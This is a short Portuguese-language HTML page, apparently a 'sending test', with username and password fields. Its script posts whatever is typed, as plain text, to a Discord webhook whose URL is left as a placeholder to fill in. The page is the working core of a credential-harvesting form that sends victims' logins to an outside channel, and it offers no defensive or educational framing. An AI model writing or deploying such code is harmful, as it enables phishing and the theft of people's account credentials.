<!DOCTYPE html>
<html>
<head><title>Teste</title></head>
<body style="background:#222; color:#fff; font-family:sans-serif; padding:20px;">
  <h2>Teste de Envio</h2>
  <input type="text" id="u" placeholder="Usuario">
  <input type="text" id="p" placeholder="Senha">
  <button onclick="enviar()">Enviar</button>
  
  <script>
    function enviar() {
      const u = document.getElementById('u').value;
      const p = document.getElementById('p').value;
      
      fetch('COLE_SEU_LINK_DO_DISCORD_AQUI', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: "User: " + u + " | Senha: " + p })
      })
      .then(() => alert("Enviado com sucesso! Checa o Discord."))
      .catch(() => alert("Deu erro no envio."));
    }
  </script>
</body>
</html>
